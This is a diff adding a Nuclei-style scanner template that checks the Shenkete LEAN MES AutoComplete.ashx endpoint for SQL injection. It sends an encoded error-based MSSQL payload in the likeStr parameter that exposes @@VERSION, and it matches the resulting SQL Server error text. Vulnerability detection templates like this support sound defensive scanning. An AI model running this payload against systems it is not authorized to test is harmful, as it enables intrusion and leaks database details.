@@ -1,0 +1,25 @@
+id: shenkete-LEAN-MES-AutoComplete-sql
+
+info:
+  name: 深科特 LEAN MES系统 AutoComplete.ashx 存在SQL注入漏洞
+  author: shenkete
+  severity: high
+  tags: shenkete
+
+http:
+  - raw:
+      - |+
+        GET /Handler/AutoComplete.ashx?field=ItemID&source=Basal_Item&likeStr=%25%32%37%25%36%31%25%36%65%25%36%34%25%32%30%25%33%31%25%33%63%25%34%30%25%34%30%25%35%36%25%34%35%25%35%32%25%35%33%25%34%39%25%34%66%25%34%65%25%32%64%25%32%64&returnCount=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nvarchar'
+          - 'Microsoft SQL Server'
+          - '转换成数据类型'
+        condition: and
